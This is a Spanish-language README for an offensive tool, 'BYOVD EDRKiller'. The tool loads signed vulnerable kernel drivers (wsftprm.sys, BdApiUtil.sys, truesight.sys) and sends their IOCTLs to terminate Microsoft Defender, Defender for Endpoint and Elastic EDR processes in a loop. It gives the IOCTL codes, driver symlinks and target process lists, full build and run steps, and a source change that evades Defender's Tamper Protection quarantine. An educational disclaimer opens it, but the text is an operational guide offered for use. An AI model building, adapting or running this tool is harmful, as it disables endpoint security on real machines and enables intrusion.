# BYOVD EDRKiller

## Aviso legal
⚠️ Este proyecto se proporciona exclusivamente con fines educativos y está destinado únicamente a su uso en entornos autorizados. Solo puedes ejecutar o desplegar este proyecto en sistemas que poseas o que tengas permiso explícito y documentado para hacer pruebas. Cualquier uso no autorizado de este proyecto contra sistemas sin consentimiento está estrictamente prohibido y puede ser ilegal.

Al utilizar este proyecto, aceptas utilizarlo de forma responsable y ética. El autor no asume ninguna responsabilidad por el uso indebido ni por las consecuencias derivadas del uso de este proyecto.

Probado en:
- Windows 11 Home actualizacion 06/2026

---

## Estructura del proyecto

```
BYOVD_EDRKiller-main/
├── Wsftprm/              # Variante 1: wsftprm.sys (Warsaw / Banco do Brasil)
├── BdApiUtil/            # Variante 2: BdApiUtil.sys (Bitdefender)
├── truesight/            # Variante 3: truesight.sys (Adlice / RogueKiller)
├── .gitignore
└── README.md
```

Cada carpeta es un proyecto independiente y autocontenido. Los tres comparten la misma estructura interna de archivos fuente (.c y .h), diferenciándose únicamente en:

| Archivo | Diferencia |
|---------|-----------|
| `config.h` / `config.c` | Nombre del driver, servicio, symlink e IOCTL |
| `vdriver.h` | Binario del driver vulnerable embebido como byte array |
| `structs.h` | Wsftprm incluye un struct `wsftprmKillBuffer` de 1036 bytes |

### Estructura interna de cada proyecto

```
├── EDRKiller_*.vcxproj      # Proyecto de Visual Studio 2022
├── config.h / config.c      # Configuración del driver vulnerable
├── vdriver.h                # Driver .sys embebido
├── common.h                 # Macros y prototipos compartidos
├── structs.h                # Estructuras (PROCESS_ENTRY, SYSTEM_PROCESS_INFORMATION, etc.)
├── typedef.h                # Typedefs de funciones NT
├── main.c                   # Punto de entrada (write → load → kill → unload)
├── killEDR.c                # Enumeración de procesos EDR + envío de IOCTL
├── driver_un_loading.c      # Write, Load, Unload, GetDeviceHandle
├── IO.c                     # WriteFileW, RemoveFileW
├── helpers.c                # errorWin32, errorNT, print_bytes
```

### Flujo de ejecución común

1. **Write** → Escribe el driver vulnerable en disco (original: `C:\Windows\System32\Drivers\<FILE>`; con modificación: directorio actual)
2. **Load** → Registra el driver como servicio y lo inicia (SCM API)
3. **Kill loop** → Enumeración de procesos EDR mediante `NtQuerySystemInformation` + envío de IOCTL en loop hasta presionar `q`
4. **Cleanup** → Detiene el servicio, elimina el driver y borra el archivo .sys

> ⚠️ **Nota sobre Windows Defender:** En sistemas con Tamper Protection habilitado, Defender elimina inmediatamente el driver de `C:\Windows\System32\Drivers\` aunque la carpeta del proyecto esté excluida. La solución es modificar `driver_un_loading.c` para usar `GetCurrentDirectoryW` en lugar de `GetWindowsDirectoryW`, escribiendo el driver en la carpeta actual. Ver [Paso 5 — Modificación para evitar cuarentena de Defender](#paso-5-ejecutar-el-edrkiller).

### EDRs objetivo (los mismos en los 3 variantes)

- **Microsoft Defender:** MsMpEng.exe, NisSrv.exe, MpDefenderCoreService.exe, smartscreen.exe
- **Microsoft Defender for Endpoint:** MsSense.exe, SenseIR.exe, SenseNdr.exe, SenseCncProxy.exe, SenseSampleUploader.exe, SenseTVM.exe
- **Elastic EDR:** elastic-agent.exe, elastic-endpoint.exe, filebeat.exe, metricbeat.exe, winlogbeat.exe

---

## Drivers Vulnerables

### 1. Wsftprm — `wsftprm.sys` (carpeta `Wsftprm/`)

| Atributo | Valor |
|----------|-------|
| Vendor | Warsaw / Banco do Brasil (módulo antifraude Topaz) |
| IOCTL | `0x22201C` |
| Symlink | `\\.\Warsaw_PM` |
| Input buffer | 1036 bytes (primeros 4 = PID, resto padding) |
| CVE | CVE-2023-1679 |
| Windows | 7 a 11 (x64) — funciona en Windows 11 24H2 con HVCI + Secure Boot ✅ |
| Blocklist MS | ❌ No bloqueado |
| Firmado | Sí, firma válida aceptada por el sistema |

### 2. BdApiUtil — `BdApiUtil.sys` (carpeta `BdApiUtil/`)

| Atributo | Valor |
|----------|-------|
| Vendor | Bitdefender (driver del antivirus) |
| IOCTL | `0x800024B4` |
| Symlink | `\\.\BdApiUtil` |
| Windows | 7 a 10 (x64) — NO carga en Windows 11 con HVCI ❌ |
| Blocklist MS | ⚠️ Indexado en LOLDDrivers |

### 3. Truesight — `truesight.sys` (carpeta `truesight/`)

| Atributo | Valor |
|----------|-------|
| Vendor | Adlice Software (RogueKiller / UCheck) |
| IOCTL | `0x22e044` |
| Symlink | `\\.\TrueSight` |
| Windows | 7 a 10 (x64) — Windows 11 lo Bloquea con error "vulnerable driver" ❌ |
| Blocklist MS | ✅ Bloqueado por Microsoft |

---

## Herramientas Recomendadas

### Visual Studio Code — Clonar y explorar el repositorio

Descargar desde: https://code.visualstudio.com/

Para clonar el repositorio y navegar el código:

```bash
git clone https://github.com/Shadow-King-Cyber/BYOVD_EDRKiller.git
cd BYOVD_EDRKiller
code .
```

VS Code permite ver la estructura del proyecto, hacer búsquedas de texto en todos los archivos, y resaltar sintaxis de C.

### OpenCode — Revisión de código asistida por IA

[OpenCode](https://opencode.ai) es una herramienta CLI interactiva que permite revisar, entender y modificar el código del repositorio mediante comandos conversacionales.

**Requiere Node.js** (descargar desde: https://nodejs.org/). Instalar OpenCode:

```bash
npm install -g @opencode/cli
```

Ejecutar dentro de la carpeta del proyecto:

```bash
opencode
```

OpenCode puede analizar la estructura del proyecto, identificar errores de compilación, y aplicar correcciones con explicaciones detalladas.

### Visual Studio 2022 — Compilación

**Descargar:** https://visualstudio.microsoft.com/downloads/

Durante la instalación seleccionar la carga de trabajo **"Desarrollo de escritorio con C++"** (Desktop development with C++). Esto instala el compilador MSVC, el Windows SDK, y MSBuild necesarios para compilar.

Cada proyecto incluye su propio archivo `.vcxproj` para Visual Studio 2022. Para compilar desde la IDE:

1. Abrir `BYOVD_EDRKiller-main` como carpeta o agregar el `.vcxproj` deseado
2. Seleccionar configuración **Release** y plataforma **x64**
3. Build → Build Solution (Ctrl+Shift+B)

### Compilación desde cmd

Requisito: **Visual Studio 2022 Build Tools** o **Visual Studio 2022 Community** instalado con la carga de trabajo "Desarrollo de escritorio con C++".

#### Opción 1 — MSBuild

```cmd
msbuild Wsftprm\EDRKiller_Wsftprm\EDRKiller_Wsftprm.vcxproj /p:Configuration=Release /p:Platform=x64 /t:Build
msbuild BdApiUtil\EDRKiller_BdApiUtil\EDRKiller_BdApiUtil.vcxproj /p:Configuration=Release /p:Platform=x64 /t:Build
msbuild truesight\EDRKiller_truesight\EDRKiller_truesight.vcxproj /p:Configuration=Release /p:Platform=x64 /t:Build
```

#### Opción 2 — cl.exe directo (tras vcvars64.bat)

```cmd
"c:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

:: Wsftprm
cd Wsftprm\EDRKiller_Wsftprm
cl /nologo /O2 /W3 /WX /permissive- /DNDEBUG /DUNICODE /D_UNICODE /utf-8 config.c driver_un_loading.c helpers.c IO.c killEDR.c main.c /link /out:EDRKiller.exe advapi32.lib

:: BdApiUtil
cd ..\..\BdApiUtil\EDRKiller_BdApiUtil
cl /nologo /O2 /W3 /WX /permissive- /DNDEBUG /DUNICODE /D_UNICODE /utf-8 config.c driver_un_loading.c helpers.c IO.c killEDR.c main.c /link /out:EDRKiller_BdApiUtil.exe advapi32.lib

:: truesight
cd ..\..\truesight\EDRKiller_truesight
cl /nologo /O2 /W3 /WX /permissive- /DNDEBUG /DUNICODE /D_UNICODE /utf-8 config.c driver_un_loading.c helpers.c IO.c killEDR.c main.c /link /out:EDRKiller_truesight.exe advapi32.lib
```
---

## Guía Paso a Paso — De la instalación a la ejecución

Esta guía asume que empezamos desde cero en un sistema Windows 11 (o 10) y queremos llegar a ejecutar el EDRKiller.

### Paso 1: Instalar Git

Descargar desde: https://git-scm.com/download/win

Durante la instalación dejar las opciones por defecto. Esto permite clonar el repositorio y usar `git` desde cmd.

### Paso 2: Instalar Visual Studio 2022 (o Build Tools)

**Opción A — Visual Studio Community (recomendado):**
1. Descargar desde: https://visualstudio.microsoft.com/downloads/
2. Ejecutar el instalador
3. Seleccionar la carga de trabajo **"Desarrollo de escritorio con C++"**
4. En "Detalles de instalación" → "Desarrollo de escritorio con C++" asegurarse de que esté marcado:
   - **MSVC v143 - VS 2022 C++ x64/x86**
   - **Windows 10/11 SDK**
5. Instalar (~5-10 GB)

**Opción B — Visual Studio 2022 Build Tools (solo cmd, más ligero):**
1. Descargar desde: https://visualstudio.microsoft.com/downloads/#build-tools-for-visual-studio-2022
2. Ejecutar el instalador
3. Seleccionar **"Desktop development with C++"**
4. Instalar

### Paso 3: Clonar el repositorio

Abrir una terminal (cmd) y ejecutar:

```cmd
git clone https://github.com/Shadow-King-Cyber/BYOVD_EDRKiller.git
cd BYOVD_EDRKiller
```

### Paso 4: Compilar el proyecto

Asegurarse de usar la **x64 Native Tools Command Prompt** o ejecutar `vcvars64.bat` para tener las variables de entorno del compilador.

**Compilar Wsftprm (el que funciona en Windows 11 con HVCI):**

```cmd
cd Wsftprm\EDRKiller_Wsftprm
cl /nologo /O2 /W3 /WX /permissive- /DNDEBUG /DUNICODE /D_UNICODE /utf-8 config.c driver_un_loading.c helpers.c IO.c killEDR.c main.c /link /out:EDRKiller.exe advapi32.lib
```

Si la compilación es exitosa, se genera el archivo `EDRKiller.exe`.

### Paso 5: Ejecutar el EDRKiller

> ⚠️ **Importante:** Ejecutar como **ADMINISTRADOR** (el programa necesita cargar un driver de kernel).

```cmd
EDRKiller.exe
```

**Lo que ocurre durante la ejecución:**

1. **Escritura del driver** → El programa extrae `wsftprm.sys` de su propio binario y lo escribe en disco
2. **Carga del driver** → Usa el API de Servicios de Windows (SCM) para registrar el driver como servicio y lo inicia
3. **Búsqueda de EDRs** → Enumera procesos activos buscando procesos de EDR (Defender, Elastic, etc.)
4. **Terminación** → Envía el IOCTL vulnerable al driver para matar cada proceso de EDR encontrado
5. **Loop** → Repite los pasos 3-4 cada 1 segundo hasta que se presione la tecla `q`
6. **Limpieza** → Al salir, detiene el servicio del driver y elimina el archivo `.sys`

**Problema conocido — Cuarentena del driver por Windows Defender:**

En Windows 11 con Tamper Protection habilitado, Windows Defender elimina inmediatamente el `.sys` de `C:\Windows\System32\Drivers\` aunque la carpeta del proyecto esté excluida, causando el error `StartServiceW - Failed to start service. (errorcode: 2)` (`ERROR_FILE_NOT_FOUND`).

**Solución aplicada y probada en Windows 11 Home:**

Modificar `driver_un_loading.c` — función `GenerateDriverFullPath`:

```c
// Cambiar GetWindowsDirectoryW por GetCurrentDirectoryW
if (GetCurrentDirectoryW(_countof(szCurrPath), szCurrPath) == 0) { ... }
swprintf_s(pszDriverPath, cchDriverPath, L"%ls\\%ls", szCurrPath, pszDriverName);
```

Esto hace que el driver se escriba en la carpeta actual del proyecto (que está excluida de Defender) en lugar de `System32\Drivers\`. El servicio se carga desde ahí sin problema. Al salir, el programa limpia el servicio y borra el `.sys` normalmente.

**Compilar tras la modificación:**

```cmd
cd Wsftprm\EDRKiller_Wsftprm
cl /nologo /O2 /W3 /WX /permissive- /DNDEBUG /DUNICODE /D_UNICODE /utf-8 config.c driver_un_loading.c helpers.c IO.c killEDR.c main.c /link /out:EDRKiller.exe advapi32.lib
```

**Posible reacción de Windows Defender:**

- Una vez que el driver esté cargado y el loop esté corriendo, los procesos de Defender serán terminados y ya no podrá interferir.

### Paso 6: Detener y limpiar manualmente (si es necesario)

Si el programa no hizo la limpieza automática o falló a medio camino:

```cmd
sc stop wsftprm
sc delete wsftprm
:: Si se usó la ruta original (System32\Drivers):
del C:\Windows\System32\Drivers\wsftprm.sys
:: Si se usó la modificación con GetCurrentDirectoryW:
del wsftprm.sys
```

---

## Notas adicionales

Los tres proyectos comparten el mismo código fuente, solo cambian el driver embebido (`vdriver.h`) y su configuración (`config.h` / `config.c`):

| Proyecto | Driver | Funciona en Win 11 con HVCI | IOCTL |
|----------|--------|----------------------------|-------|
| `Wsftprm` | `wsftprm.sys` (Warsaw) | ✅ Sí | `0x22201C` |
| `BdApiUtil` | `BdApiUtil.sys` (Bitdefender) | ❌ No | `0x800024B4` |
| `truesight` | `truesight.sys` (Adlice) | ❌ Bloqueado por MS | `0x22e044` |

Solo `Wsftprm` es funcional en sistemas Windows 11 actualizados con Secure Boot, VBS y HVCI habilitados.

---


## Créditos
Me inspiré para ampliar las herramientas que ofrece el Laboratorio de Evasión (CETP de [Altered Security](https://www.alteredsecurity.com/evasionlab)), impartido por [Saad Ahla](https://www.linkedin.com/in/saad-ahla/).
Y tambien en [0xJs](https://github.com/0xJs/BYOVD_EDRKiller?tab=readme-ov-file) ya que use su repositorio para compilar los drivers, lo unico que hice fue hacer unas correcciones al codigo ya que la compilacion daba errores por version o de sintaxis y en algunas variables que no leia bien, justo por eso recominedo usar OpenCode, ya que pueden usarlo si les manda error al compilar el driver, y lo pueden solucionar rapido.


